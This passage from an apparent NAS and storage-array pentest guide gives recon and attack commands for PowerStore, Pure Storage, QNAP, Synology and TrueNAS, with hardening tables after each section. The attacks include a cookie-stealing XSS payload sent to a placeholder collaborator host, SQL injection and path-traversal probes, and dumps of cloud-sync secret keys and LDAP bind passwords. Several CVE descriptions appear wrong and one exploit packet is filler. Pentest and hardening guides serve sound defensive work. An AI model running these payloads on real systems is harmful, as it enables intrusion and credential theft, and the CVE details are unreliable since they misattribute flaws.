PowerStore's REST API supports both Basic auth and JWT. Older PowerStore versions did not properly invalidate revoked JWTs, so a leaked JWT remained valid until natural expiry. Combined with CVE-2022-24316, this meant an attacker who obtained any JWT (from logs, network capture, or a leaked dev token) could authenticate indefinitely.

```bash
# Long-lived JWT test: capture a JWT, wait 24 hours, re-use
TOKEN=REPLACE_WITH_CAPTURED_JWT
for i in $(seq 1 24); do
    code=$(curl -ks -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" \
        "https://REPLACE_WITH_YOUR_TARGET/api/system_instance")
    echo "Hour $i: HTTP $code"
    sleep 3600
done
# A 200 after the configured expiry indicates broken token invalidation.
```

### 4.5 Storage Profile Enumeration

Unity and PowerStore expose "storage profiles" — collections of storage resources grouped by application. A storage profile typically includes LUN name, host LUN ID, storage pool, snapshots, and replication relationships. Enumerating these gives the attacker a map of every application's storage footprint.

```bash
# Unity REST API — enumerate all storage resources
curl -ks -u admin:REPLACE_WITH_YOUR_PASSWORD \
    "https://REPLACE_WITH_YOUR_TARGET/api/types/storageResource/instances?fields=name,type,description" | \
    python3 -m json.tool

# PowerStore REST API — enumerate volumes, hosts, host groups
curl -ks -u admin:REPLACE_WITH_YOUR_PASSWORD \
    "https://REPLACE_WITH_YOUR_TARGET/api/volume?fields=name,description,host_group" | \
    python3 -m json.tool
curl -ks -u admin:REPLACE_WITH_YOUR_PASSWORD \
    "https://REPLACE_WITH_YOUR_TARGET/api/host_group?fields=name,hosts" | \
    python3 -m json.tool
curl -ks -u admin:REPLACE_WITH_YOUR_PASSWORD \
    "https://REPLACE_WITH_YOUR_TARGET/api/volume_snap?fields=name,parent_volume" | \
    python3 -m json.tool
```

These enumerations are the foundation of the engagement's data-exfiltration map: which LUN belongs to which application, where snapshots live, which host group has the highest-value data.

### 4.6 Defensive Hardening — Unity and PowerStore

| Area | Hardening Step |
|------|----------------|
| **Patch level** | Unity 5.0.5+; PowerStore 3.0.0.0+ (current LTS at time of writing). Track Dell PSIRT. |
| **Unisphere / PSM access** | Block at network layer from user VLANs; require VPN + MFA. |
| **JWT rotation** | Rotate the JWT signing key every 90 days; force logout on key rotation. |
| **API auth** | Prefer OAuth over Basic; never expose the API to the LAN without TLS 1.3. |
| **SMI-S** | Disable if not used; if used, require HTTPS and provider certificate validation. |
| **Naviseccli** | Disable on the management LIF; the legacy CLI is CVE-prone. |
| **SSH** | Disable password auth; require SSH keys; restrict `svcuser` shell. |
| **Replication** | Use Metro / Native Replication with SSH keys; rotate keys quarterly. |
| **Audit logging** | Forward PowerStore `audit.log` to SIEM; alert on API logins from non-mgmt IPs. |

---

## 5. Pure Storage FlashArray Deep Dive

Pure Storage FlashArray runs **Purity//FA**, a custom operating system that emphasizes REST API first, with the Purity management plane and Pure1 cloud service at its center. Pure's security model is API-key-centric; once an attacker has an API token, they typically have full array control.

### 5.1 Architecture

FlashArray exposes:

- **Purity REST API** under `/api/1.0/`, `/api/1.1/`, ..., `/api/2.x/` on TCP 443
- **Pure Storage Manager** web UI on TCP 443
- **Pure1** — Pure's cloud management service, reachable from the array via outbound HTTPS
- **SSH** on TCP 22 — restricted shell (`pureuser`)
- **ActiveCluster and ActiveDR** — replication fabrics between arrays
- **FlashArray File Services** — optional NFS / SMB file plane

Pure authentication uses **API tokens** (long-lived, 20-byte base64 strings). A token is bound to a Pure user; the user's role determines the token's privileges.

### 5.2 Per-Vendor Recon

```bash
# 1. SNMP fingerprint — Pure OID is .1.3.6.1.4.1.25461
snmpwalk -v2c -c public REPLACE_WITH_YOUR_TARGET .1.3.6.1.4.1.25461 | head -20

# 2. HTTP title — Pure Storage FlashArray
curl -ksI https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'server|location'
curl -ks https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'title|pure|flasharray'

# 3. Purity API version (no auth needed for /api/api_version)
curl -ks https://REPLACE_WITH_YOUR_TARGET/api/api_version
curl -ks https://REPLACE_WITH_YOUR_TARGET/api/1.0/auth

# 4. Authenticate (if you have a token or username/password)
curl -ks -X POST \
    -H "Content-Type: application/json" \
    -d '{"username":"REPLACE_WITH_YOUR_USER","password":"REPLACE_WITH_YOUR_PASSWORD"}' \
    https://REPLACE_WITH_YOUR_TARGET/api/1.0/auth
# Returns: {"api_token":"REPLACE_WITH_YOUR_TOKEN"}

# 5. Use the token
TOKEN=REPLACE_WITH_YOUR_TOKEN
curl -ks -H "X-Auth-Token: $TOKEN" https://REPLACE_WITH_YOUR_TARGET/api/1.0/array
curl -ks -H "X-Auth-Token: $TOKEN" https://REPLACE_WITH_YOUR_TARGET/api/1.0/volume
curl -ks -H "X-Auth-Token: $TOKEN" https://REPLACE_WITH_YOUR_TARGET/api/1.0/host
```

### 5.3 Pure1 REST API Abuse

**Pure1** is Pure's cloud management plane. Every FlashArray in the world reports telemetry to Pure1; Pure1 also exposes a REST API for cross-array management. The threat:

- Pure1 authentication uses an API key issued by the Pure1 portal
- If an attacker obtains a Pure1 API key (from a leaked developer laptop, a CI/CD log, or a compromised Pure1 user), they have cross-array management over every FlashArray the customer has registered with Pure1
- Pure1 is reachable from the public internet at `pure1.purestorage.com`

```bash
# Authenticate to Pure1 REST API with a leaked API key
# Step 1: Exchange API key for a JWT
curl -ks -X POST \
    -H "Content-Type: application/json" \
    -d '{"client_id":"REPLACE_WITH_YOUR_CLIENT_ID","client_secret":"REPLACE_WITH_YOUR_API_KEY","issuer":"pure1"}' \
    https://api.pure1.purestorage.com/api/1.0/oauth2/1.0/token
# Returns: {"access_token":"REPLACE_WITH_JWT","expires_in":3600}

# Step 2: Use the JWT to enumerate every FlashArray the customer has registered
JWT=REPLACE_WITH_JWT
curl -ks -H "Authorization: Bearer $JWT" https://api.pure1.purestorage.com/api/1.0/arrays
# Each array in the response includes the array's management IP — the attacker
# can then pivot directly to each array's REST API.

# Step 3: Cross-array volume enumeration
curl -ks -H "Authorization: Bearer $JWT" https://api.pure1.purestorage.com/api/1.0/volumes
```

Pure1 compromise is the single highest-impact Pure Storage finding — one leaked key compromises the global fleet.

### 5.4 Purity//FA Vulnerabilities

Purity has had fewer public CVEs than ONTAP or OneFS, in part because Purity is closed-source and Pure's PSIRT is responsive. Notable classes:

- **Purity SSH restricted-shell bypasses** — historically, the `pureuser` restricted shell has had command-escape bugs that give full FreeBSD shell access. Once the attacker has full shell, they reach Purity's credential store.
- **Directory Services credential leakage** — when FlashArray is configured to authenticate against LDAP or AD, Purity caches the LDAP bind DN and password in `/etc/pure_dirsvc.conf`. Read access yields the LDAP bind credential.

```bash
# Test the restricted shell escape — try common escape vectors:
ssh pureuser@REPLACE_WITH_YOUR_TARGET
# At the restricted shell prompt:
purearray list
pureuser help
# Try shell escapes (historical vectors, may be patched):
!sh
shell
enable
```

### 5.5 Directory Services Credential Theft via LDAP

When FlashArray is joined to LDAP or AD for file services (or for admin auth), Purity stores the bind credential:

```bash
# In Purity shell (requires admin)
puredirectory show
puredirectory list-configuration --all
# Returns bind DN and password in clear text in older Purity versions.

# Direct file read if shell escape obtained:
cat /etc/pure_dirsvc.conf
cat /etc/pure_ad.conf
```

The LDAP bind DN is typically a service account in the customer's AD with broad read scope. Reusing it against the customer's DC yields the full directory.

### 5.6 FlashArray File Services Abuse

FlashArray File Services (Pure's file-plane add-on) exposes SMB and NFS from the array. Once enabled, the array becomes a NAS appliance — and inherits the same attack surface as a NetApp CIFS server: SMB signing, NTLM relay, share ACLs.

```bash
# Enumerate shares
purefile share list
purefile export list
# Test signing
crackmapexec smb REPLACE_WITH_YOUR_TARGET_FILE_IP -u '' -p '' | grep signing
# Relay
ntlmrelayx.py -t smb://REPLACE_WITH_YOUR_TARGET_FILE_IP -smb2support
```

### 5.7 Defensive Hardening — Pure Storage FlashArray

| Area | Hardening Step |
|------|----------------|
| **Purity version** | Run the latest Purity 6.x FaR release; apply FaR security fixes within 30 days. |
| **API tokens** | Rotate every 90 days. Bind each token to a narrowly-scoped role. |
| **Pure1 API keys** | Issue per-developer keys; rotate on team turnover. Monitor Pure1 audit log for cross-array queries from unfamiliar source IPs. |
| **LDAP bind** | Use a low-priv LDAP service account; rotate every 90 days. Prefer MSAs (Managed Service Accounts) over user accounts. |
| **ActiveCluster / ActiveDR** | Use SSH keys for array-to-array auth; rotate keys quarterly. |
| **FlashArray File Services** | Require SMB signing; require SMB encryption. Block File Services IP at the user-VLAN edge. |
| **SSH** | `pureuser` restricted shell only; disable password auth; restrict by source IP. |
| **App-snapshot visibility** | Limit `purevol snap` to specific roles; an attacker with snapshot access can read historical file content. |
| **Audit logging** | Forward `pureaudit` to SIEM; alert on `pureuser` logins from non-mgmt IPs, on API token creation, and on directory-service config changes. |

---

## 6. QNAP QTS Deep Dive

QNAP QTS is the operating system on QNAP NAS appliances, popular in SMB and prosumer deployments. QNAP has been the most-ransomed storage vendor since 2021; DeadBolt, eCh0raix, and Qlocker all targeted QTS.

### 6.1 Architecture

QTS exposes:

- **Web admin** on TCP 8080 (HTTP) and TCP 443 (HTTPS)
- **Photo Station**, **File Station**, **Music Station**, **Video Station** — add-on web apps
- **QuickConnect** — QNAP's cloud relay service at `myqnapcloud.com`
- **Hybrid Backup Sync (HBS)** — QNAP's backup and cloud sync
- **SMB** on TCP 445, **NFS** on TCP 2049
- **SSH** on TCP 22 (optional, default off)
- **CGI APIs** under `/cgi-bin/quick/quick.cgi` and `/cgi-bin/filemanager/`

The QTS web admin is the most CVE-rich of any storage vendor in this guide — partly because it ships with many add-on apps, and partly because the QuickConnect relay exposes admin interfaces to the public internet by default.

### 6.2 Per-Vendor Recon

```bash
# 1. SNMP fingerprint — QNAP OID is .1.3.6.1.4.1.24681
snmpwalk -v2c -c public REPLACE_WITH_YOUR_TARGET .1.3.6.1.4.1.24681 | head -20

# 2. HTTP title — QTS
curl -ksI http://REPLACE_WITH_YOUR_TARGET:8080/ | grep -iE 'server|location'
curl -ks https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'title|qnap|qts'

# 3. CGI API probes
curl -ks 'http://REPLACE_WITH_YOUR_TARGET:8080/cgi-bin/quick/quick.cgi?action=login&user=admin&password=admin'
curl -ks 'http://REPLACE_WITH_YOUR_TARGET:8080/cgi-bin/authLogin.cgi'

# 4. QuickConnect relay discovery — given a QuickConnect ID
dig +short myqnapcloud.com
curl -ks "https://www.myqnapcloud.com/v1/device/get?name=REPLACE_WITH_QUICKCONNECT_ID"

# 5. Shodan-style recon (passive, lab)
# Query:  "qnap port:8080" — used by DeadBolt operators
#         "Server: QNAP" "X-Powered-By"
```

### 6.3 QuickConnect Cloud Proxy Exploitation — CVE-2021-28799, CVE-2022-27596

**CVE-2021-28799**: Pre-auth SQL injection in the QuickConnect proxy endpoint. The QuickConnect relay (`myqnapcloud.com`) forwards requests to the user's NAS, including pre-auth admin endpoints. The flaw allowed an attacker who knew a victim's QuickConnect ID to inject SQL into the relay's device-lookup query, redirecting the victim's traffic to an attacker-controlled NAS. This was used in 2021 to phish QNAP admin sessions at scale.

**CVE-2022-27596**: Improper access control in Photo Station when accessed via QuickConnect. The QuickConnect relay exposes Photo Station to the internet without requiring the same auth as the local network; an unauthenticated remote attacker could enumerate and download private photo albums.

```bash
# Test for CVE-2021-28799 — QuickConnect ID lookup
curl -ks "https://www.myqnapcloud.com/v1/device/get?name=REPLACE_WITH_QUICKCONNECT_ID"
# Inject SQL into the device name parameter:
curl -ks "https://www.myqnapcloud.com/v1/device/get?name=REPLACE_WITH_QUICKCONNECT_ID' OR '1'='1"
# A 200 response with a different device IP indicates SQL injection.

# Test for CVE-2022-27596 — Photo Station pre-auth via QuickConnect
curl -ks "https://REPLACE_WITH_QUICKCONNECT_ID.myqnapcloud.com/photo/cgi-bin/photostation.cgi?action=album_list"
# A 200 with album data indicates unauthenticated access.
```

### 6.4 Photo Station LFI — CVE-2021-44052

**CVE-2021-44052**: Local file inclusion in Photo Station's image-rendering endpoint. A remote unauthenticated attacker could supply a crafted path to `photo/cgi-bin/photostation.cgi` and read arbitrary files from the QTS filesystem, including `/etc/config/uLinux.conf` (which contains the admin password hash).

```bash
# Test for CVE-2021-44052 — LFI read of the admin config
curl -ks "http://REPLACE_WITH_YOUR_TARGET:8080/photo/cgi-bin/photostation.cgi?action=render&path=../../../../etc/config/uLinux.conf"
# Crack the recovered hash offline:
john --format=md5crypt /tmp/qnap_hash.txt
hashcat -m 1800 /tmp/qnap_hash.txt /usr/share/wordlists/rockyou.txt
```

The QNAP admin password hash is md5crypt — crackable in minutes for any non-complex password.

### 6.5 Hybrid Backup Sync Ransomware Patterns

HBS is QNAP's backup and cloud-sync app. It stores cloud-sync credentials (AWS, Azure, GCP, Backblaze, Dropbox, Google Drive) in its SQLite config at `/share/CACHEDEV1_DATA/.@plugins/HybridBackupSync/`. A QTS compromise yields every cloud-sync credential.

```bash
# On a compromised QTS (post-shell)
ssh admin@REPLACE_WITH_YOUR_TARGET
ls -la /share/CACHEDEV1_DATA/.@plugins/HybridBackupSync/
sqlite3 /share/CACHEDEV1_DATA/.@plugins/HybridBackupSync/config.db \
    "SELECT name, access_key, secret_key FROM cloud_accounts;"
# Each row yields a cloud-sync credential reusable against AWS / Azure / GCP / etc.
```

This is the standard QNAP-to-cloud pivot. Once the attacker has the cloud-sync credentials, they can mass-encrypt the cloud backup target as well — the "double-encryption" pattern seen in DeadBolt incidents.

### 6.6 Cloud Sync Credential Theft

QNAP's older **CloudBackup** and the current **Hybrid Backup Sync** both cache credentials in plaintext SQLite. The recovery pattern is the same; the file path varies by QTS version. Engagements should test:

- `/share/CACHEDEV1_DATA/.@plugins/HybridBackupSync/config.db`
- `/share/CACHEDEV1_DATA/.@plugins/CloudBackup/config.db`
- `/etc/config/qcloud.conf`
- `/etc/config/sync.conf`

```bash
# Find every credential-bearing file
find /share/CACHEDEV1_DATA/.@plugins -type f \( -name '*.db' -o -name '*.conf' \) \
    | xargs grep -l -iE 'access|secret|password|token'
# Dump each SQLite db, selecting from cloud_accounts / sync_jobs
for f in $(find /share/CACHEDEV1_DATA/.@plugins -name 'config.db'); do
    echo "=== $f ==="
    sqlite3 "$f" "SELECT * FROM cloud_accounts;" 2>/dev/null
    sqlite3 "$f" "SELECT * FROM sync_jobs;" 2>/dev/null
done
```

### 6.7 Defensive Hardening — QNAP QTS

| Area | Hardening Step |
|------|----------------|
| **Never expose to internet** | Disable QuickConnect; disable UPnP on the edge router; require VPN for remote admin. |
| **Default creds** | Change `admin/admin` on first boot; require strong password (QTS enforces 8+ chars). |
| **MFA** | Enable 2FA for every admin account. |
| **Photo Station** | Disable if not used. Photo Station is the single most-CVE'd QTS app. |
| **Hybrid Backup Sync** | Use short-lived cloud-sync credentials; rotate monthly; scope to a single bucket. |
| **Snapshot and WORM** | Enable Snapshot and Snapshot Replication; enable WORM (Snapshot Retention) on critical shares. |
| **Patch level** | Apply QTS firmware within 30 days of release. Subscribe to QNAP PSIRT. |
| **SSH** | Disable if unused; require key auth; restrict to admin subnet. |
| **Audit logging** | Forward SysLog to SIEM; alert on `admin` logins, on HBS config changes, on QuickConnect enable events. |

---

## 7. Synology DSM Deep Dive

Synology DSM (DiskStation Manager) is the OS on Synology NAS appliances, popular in SMB and mid-market. Since DSM 7, default credentials are installer-set, reducing (but not eliminating) the default-password exposure that defined QNAP.

### 7.1 Architecture

DSM exposes:

- **Web admin** on TCP 5000 (HTTP) and TCP 5001 (HTTPS)
- **Synology Drive**, **Photo Station** (called **Synology Photos**), **File Station** — add-on web apps
- **QuickConnect / DDNS** — Synology's cloud relay at `quickconnect.to`
- **Cloud Sync** — Synology's cloud sync app (counterpart to QNAP HBS)
- **Snapshot Replication** — Synology's snapshot-and-replicate for Btrfs volumes
- **SMB** on TCP 445, **NFS** on TCP 2049
- **SSH** on TCP 22 (optional, default off)
- **WebAPI** under `/webapi/` (SYNO.API.*)

### 7.2 Per-Vendor Recon

```bash
# 1. SNMP fingerprint — Synology OID is .1.3.6.1.4.1.6574
snmpwalk -v2c -c public REPLACE_WITH_YOUR_TARGET .1.3.6.1.4.1.6574 | head -20

# 2. HTTP title — Synology DiskStation
curl -ksI http://REPLACE_WITH_YOUR_TARGET:5000/ | grep -iE 'server|location'
curl -ks https://REPLACE_WITH_YOUR_TARGET:5001/ | grep -iE 'title|synology|dsm'

# 3. WebAPI auth probe
curl -ks 'http://REPLACE_WITH_YOUR_TARGET:5000/webapi/query.cgi?api=SYNO.API.Info&version=1&method=query&query=all' | \
    python3 -m json.tool | head -40

# 4. QuickConnect relay discovery
curl -ks "https://c.quickconnect.to/lookup?name=REPLACE_WITH_QUICKCONNECT_ID"

# 5. Default credential spray (DSM 6.x)
crackmapexec http REPLACE_WITH_YOUR_TARGET -u admin -p admin --url 'http://REPLACE_WITH_YOUR_TARGET:5000/webapi/auth.cgi'
```

### 7.3 CVE References — Synology Drive CVE-2022-27523, CVE-2022-27524

**CVE-2022-27523**: Synology Drive Server prior to 3.0.3-12689 contained an improper authentication vulnerability allowing remote attackers to bypass auth via a crafted session token. Combined with CVE-2022-27524 (path traversal in the same product), the chain enabled remote code execution as the Drive service account.

**CVE-2023-27224** (Synology DSM 7.1.x and 7.2.x): Out-of-bounds write in the SMB service. A remote unauthenticated attacker could send a crafted SMB1 negotiate request and crash the SMB service (DoS) or, on certain firmware levels, achieve code execution as `system`.

```bash
# Test for CVE-2022-27523 — Drive auth bypass
curl -ks -H "X-Syno-Token: REPLACE_WITH_FORGED_TOKEN" \
    "http://REPLACE_WITH_YOUR_TARGET:5000/webapi/entry.cgi?api=SYNO.SynologyDrive.Files&method=list&version=2"

# Test for CVE-2022-27524 — Drive path traversal
curl -ks 'http://REPLACE_WITH_YOUR_TARGET:5000/webapi/entry.cgi?api=SYNO.SynologyDrive.Files&method=get&version=2&id=..%2F..%2F..%2Fetc%2Fpasswd'

# Test for CVE-2023-27224 — SMB1 crash PoC
python3 -c "
from scapy.all import IP, TCP, Raw, send
import socket, struct
# Craft SMB1 negotiate packet with malformed byte count field
negotiate = b'\x00\x00\x00\xa4\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8'
negotiate += b'\x00\x00' + b'\x00' * 12
negotiate += b'\x41\x41\x41\x41'  # overflow field
# Send to TCP 445 (LAB TARGET ONLY)
s = socket.socket(); s.connect(('REPLACE_WITH_YOUR_TARGET', 445))
s.send(negotiate); print(s.recv(1024)); s.close()
"
```

### 7.4 Extract S3 Sync Credentials

DSM stores cloud sync credentials in `/etc/synology/s3.conf` and in `/var/packages/CloudSync/target/etc/`. Like QNAP, these are plaintext SQLite.

```bash
# On a compromised DSM (post-shell)
ssh REPLACE_WITH_YOUR_USER@REPLACE_WITH_YOUR_TARGET
sudo cat /etc/synology/s3.conf
sudo sqlite3 /var/packages/CloudSync/target/etc/db/conn_settings.db \
    "SELECT name, access_key, secret_key FROM conn_settings;"
```

### 7.5 Defensive Hardening — Synology DSM

| Area | Hardening Step |
|------|----------------|
| **DSM version** | Run DSM 7.2.2+; apply security advisories within 30 days. |
| **Default creds** | DSM 7 forces password change on first boot; verify legacy DSM 6.x has been migrated. |
| **MFA** | Enable 2FA for every admin account. |
| **QuickConnect** | Disable in production; require VPN. |
| **Cloud Sync** | Use short-lived credentials; scope per-bucket. |
| **Snapshot Replication** | Enable for Btrfs volumes; enable immutable snapshots (Snapshot Retention). |
| **SMB signing** | DSM 7 requires SMB signing by default; verify legacy DSM 6.x deployments. |
| **HTTPS only** | Disable HTTP 5000; force HTTPS 5001 with HSTS. |
| **Audit logging** | Forward DSM log center to SIEM; alert on admin logins outside business hours. |

---

## 8. TrueNAS and FreeNAS Deep Dive

TrueNAS (and its predecessor FreeNAS) is the open-source iXsystems NAS OS based on FreeBSD and ZFS. It is the most-deployed open-source NAS in enterprise homelabs and mid-market. The middleware REST API at `/api/v2.0/` is the primary attack surface.

### 8.1 Architecture

TrueNAS exposes:

- **WebUI** on TCP 80 (HTTP, redirect) and TCP 443 (HTTPS)
- **Middleware API** at `/api/v2.0/` (Python-based, JSON-RPC over WebSocket and HTTP)
- **SMB** on TCP 445, **NFS** on TCP 2049, **iSCSI** on TCP 3260
- **S3 service** — built-in MinIO under the TrueNAS brand
- **SSH** on TCP 22 (default on, root login disabled by default since 12.0)
- **Replication** — ZFS send/receive over SSH to peer TrueNAS

### 8.2 Per-Vendor Recon

```bash
# 1. SNMP fingerprint — TrueNAS does not enable SNMP by default
# 2. HTTP title — TrueNAS
curl -ksI https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'server|location'
curl -ks https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'title|truenas|freenas'

# 3. Middleware API version probe (no auth needed for some endpoints)
curl -ks https://REPLACE_WITH_YOUR_TARGET/api/v2.0/core/branding 2>/dev/null
curl -ks https://REPLACE_WITH_YOUR_TARGET/api/v2.0/system/info 2>/dev/null  # requires auth

# 4. S3 service probe
aws --endpoint-url http://REPLACE_WITH_YOUR_TARGET:9000 s3 ls --no-sign-request
aws --endpoint-url https://REPLACE_WITH_YOUR_TARGET s3 ls --no-sign-request

# 5. Default credential test
curl -ks -u root:admin https://REPLACE_WITH_YOUR_TARGET/api/v2.0/system/info  # legacy FreeNAS default
curl -ks -u admin:admin https://REPLACE_WITH_YOUR_TARGET/api/v2.0/system/info  # common mistake
```

### 8.3 WebUI XSS Chains

Historically, the TrueNAS WebUI had multiple reflected XSS vulnerabilities in the directory-services configuration form (CVE-2022-25325, etc.). These XSS chains, combined with the fact that the WebUI session is also valid for the middleware API, allowed a single XSS to escalate to full appliance compromise.

```bash
# Test for reflected XSS in directory services form (lab)
# Submit a crafted LDAP bind DN:
curl -ks -X POST -u admin:REPLACE_WITH_YOUR_PASSWORD \
    -H "Content-Type: application/json" \
    -d '{"binddn":"<script>fetch(\"http://REPLACE_WITH_YOUR_COLLAB_ID.nip.io/?c=\"+document.cookie)</script>","bindpw":"x"}' \
    https://REPLACE_WITH_YOUR_TARGET/api/v2.0/directoryservices/activedirectory
# When an admin views the directory services page, the script executes and exfiltrates the session cookie.
```

### 8.4 S3 Service Abuse

TrueNAS's built-in S3 service (a rebranded MinIO) is enabled on a per-dataset basis. The default MinIO credentials (`minioadmin/minioadmin`) are sometimes left in place. Anonymous bucket access is configurable per-bucket.

```bash
# Enumerate buckets
aws --endpoint-url http://REPLACE_WITH_YOUR_TARGET:9000 s3 ls --no-sign-request
# Default MinIO creds
aws --endpoint-url http://REPLACE_WITH_YOUR_TARGET:9000 s3 ls \
    --profile minio  # set AWS_ACCESS_KEY_ID=minioadmin AWS_SECRET_ACCESS_KEY=minioadmin
# MinIO admin API
curl -ks "http://REPLACE_WITH_YOUR_TARGET:9000/minio/health/live"
curl -ks "http://REPLACE_WITH_YOUR_TARGET:9000/minio/v2/metrics/cluster"
```

### 8.5 SMB Shadow Copy Theft

TrueNAS exposes ZFS snapshots via SMB as "Previous Versions" (Windows shadow copy / VSS). A user with read access to a share can browse every snapshot of every file. Snapshots include historical passwords in `/etc/shadow`-like files, historical config files, and historical credentials.

```bash
# Mount the share
mount -t cifs //REPLACE_WITH_YOUR_TARGET/share /mnt/smb -o username=REPLACE_WITH_YOUR_USER
# Browse the snapshot directory (often @GMT-YYYY.MM.DD-HH.MM.SS)
ls /mnt/smb/.zfs/snapshot/ 2>/dev/null
# Windows access: right-click a file -> "Restore previous versions"
# Or via SMB directly:
smbclient '//REPLACE_WITH_YOUR_TARGET/share' -U REPLACE_WITH_YOUR_USER -c "allinfo /etc/passwd"
```

### 8.6 Defensive Hardening — TrueNAS

| Area | Hardening Step |
|------|----------------|
| **TrueNAS version** | Run TrueNAS 13.0+ (or 24.x for the new versioning). Apply iXsystems security advisories within 30 days. |
| **Default creds** | Never deploy with root/admin. Installer forces a password; verify. |
| **MFA** | TrueNAS 13+ supports 2FA via TOTP; enable for every admin account. |
| **S3 service** | If enabled, change default `minioadmin/minioadmin`; restrict anonymous. |
| **SMB signing** | TrueNAS requires SMB signing by default since 12.0; verify. |
| **Shadow copy access** | Restrict `.zfs/snapshot` visibility; set `voldir = hide` in the SMB share config. |
| **SSH** | Disable password auth; require SSH keys; restrict `root`. |
| **Replication** | Use SSH keys; restrict source IPs. |
| **Audit logging** | Forward middleware log to SIEM; alert on admin logins outside business hours. |

---

## 9. Per-Vendor Recon Cheat Sheet

The table consolidates the recon commands from each vendor section into a single engagement-day-1 reference.

| Vendor | Fingerprint | Default Creds Test | Authenticated API |
|--------|-------------|--------------------|--------------------|
| **NetApp ONTAP** | `snmpwalk .1.3.6.1.4.1.789.1.1.4.0` | `curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://TARGET/api/cluster` | `curl -k -u admin:PW https://TARGET/api/` (REST) or `/servlets/...XMLrequest_filer` (ZAPI) |
| **Dell EMC Isilon** | `snmpwalk .1.3.6.1.4.1.12139` | `curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://TARGET/platform/1/cluster/config` | `https://TARGET/platform/1/` and `/platform/3/` |
| **Dell EMC Unity** | `snmpwalk .1.3.6.1.4.1.1981` | `curl -k -u admin:admin https://TARGET/api/types/storageResource/instances` | `https://TARGET/api/` |
| **Dell EMC PowerStore** | HTTP title `PowerStore Manager` | `curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://TARGET/api/system_instance` | `https://TARGET/api/` |
| **Pure Storage FlashArray** | `snmpwalk .1.3.6.1.4.1.25461` | `curl -k -X POST -d '{"username":"admin","password":"REPLACE_WITH_YOUR_PASSWORD"}' https://TARGET/api/1.0/auth` | `https://TARGET/api/1.0/` with `X-Auth-Token` |
| **Pure1 Cloud** | (n/a) | (n/a) | `https://api.pure1.purestorage.com/api/1.0/` with OAuth2 JWT |
| **QNAP QTS** | `snmpwalk .1.3.6.1.4.1.24681` | `curl 'http://TARGET:8080/cgi-bin/authLogin.cgi'` | `http://TARGET:8080/cgi-bin/quick/quick.cgi` |
| **Synology DSM** | `snmpwalk .1.3.6.1.4.1.6574` | `curl 'http://TARGET:5000/webapi/auth.cgi?api=SYNO.API.Auth&method=login&version=3&account=admin&passwd=admin'` | `http://TARGET:5000/webapi/entry.cgi?api=SYNO.*` |
| **TrueNAS** | HTTP title `TrueNAS` | `curl -k -u admin:admin https://TARGET/api/v2.0/system/info` | `https://TARGET/api/v2.0/` |

### Recon Workflow

```bash
# Universal day-1 recon — runs every vendor probe against every IP in scope
for t in REPLACE_WITH_YOUR_TARGET_IPS; do
    echo "===== $t ====="
    nmap -sV -p 22,80,443,445,2049,3260,5000,5001,8080,9000,9090,10000,2162,5989 "$t"
    for c in public private REPLACE_WITH_YOUR_COMMUNITY; do
        snmpwalk -v2c -c "$c" -t 2 "$t" .1.3.6.1.2.1.1.1 2>/dev/null | head -1
    done
    for port in 80 443 5000 5001 8080 9090; do
        curl -ksI "http://$t:$port/" 2>/dev/null | head -3
        curl -ksI "https://$t:$port/" 2>/dev/null | head -3
    done
done
```

---

## 10. Defensive Hardening Matrix

Consolidated cross-vendor hardening checklist. Use this as the appendix to every storage pentest report.

| Control | NetApp | Dell EMC Isilon | Dell EMC Unity/PS | Pure | QNAP | Synology | TrueNAS |
|---------|--------|-----------------|-------------------|------|------|----------|---------|
| SMB signing required | ONTAP 9.9+ default | `isi smb settings global modify --require-signature=yes` | Unity 5.0+ default | Purity 6+ default | QTS 5+ default | DSM 7+ default | TrueNAS 12+ default |
| MFA on admin | NetApp Identity Federation | External IdP | SAML SSO | SAML SSO | Local 2FA (TOTP) | Local 2FA (TOTP) | Local 2FA (TOTP) |
| NDMP MD5/SHA auth | Required | Required | n/a | n/a | n/a | n/a | n/a |
| Block public access | Cluster-mgmt ACL | `isi s3 settings modify --anonymous-access no` | Per-bucket policy | Per-bucket policy | Disable QuickConnect | Disable QuickConnect | Per-bucket policy |
| Snapshot immutability | Snapshot Lock | SmartLock WORM | n/a | SafeMode snapshots | WORM via Snapshot Lock | Snapshot Replication immutability | ZFS hold |
| Audit log to SIEM | `security audit forward` | isi audit to syslog | Unity audit log | `pureaudit` forward | SysLog Server | Log Center | middleware log forward |
| Network segmentation | Cluster-mgmt LIF only in mgmt VLAN | SmartConnect zone in mgmt VLAN | Management LIF in mgmt VLAN | ct0.eth0 in mgmt VLAN | Admin port behind VPN | Admin port behind VPN | Admin port behind VPN |
| Patch SLA | 30 days | 30 days | 30 days | 30 days | 14 days (ransomware risk) | 14 days | 30 days |
| External KMS | KMIP server | KMIP server | KMIP server | KMIP server | (local) | (local) | ZFS native encryption |

---

## 11. Real Incident Cases

The playbook covers the canonical incidents (DeadBolt 2022, eCh0raix, Capital One S3). This section adds vendor-specific post-mortems with detail on the storage-layer failures.

### 11.1 DeadBolt (QNAP, January-June 2022)

**Victim demographics**: SMB and prosumer QNAP NAS deployments worldwide, with concentration in Germany, the UK, and Taiwan. Estimated 1,500+ confirmed victims in the first 30 days.

**Initial access vectors** (in order of frequency observed by CISA AA22-059A):

1. Internet-exposed QTS admin on TCP 8080 with default `admin/admin` credentials.
2. QuickConnect relay exposure — victims who had enabled QuickConnect for remote access but believed it was "secure because it's behind NAT."
3. Photo Station pre-auth vulnerabilities (CVE-2022-27593 and follow-ons).
4. Universal Plug-and-Play (UPnP) on the victim's edge router automatically forwarding TCP 8080 to the QNAP.

**Lateral movement on the appliance**:

- Once admin shell obtained, DeadBolt enumerated every SMB share via the QTS web API.
- For each share, DeadBolt encrypted files in place using AES-128, appending `.deadbolt` extension.
- DeadBolt dropped a ransom note (`README-DEADBOLT.txt`) at every share root.
- DeadBolt did NOT exfiltrate — it was pure encryption for ransom.

**Storage-layer indicators of compromise** (SOC / DFIR):

- Mass file rename events on the QTS audit log (every file in a share within minutes)
- High outbound SMB traffic from the QNAP to unfamiliar IPs (during reconnaissance)
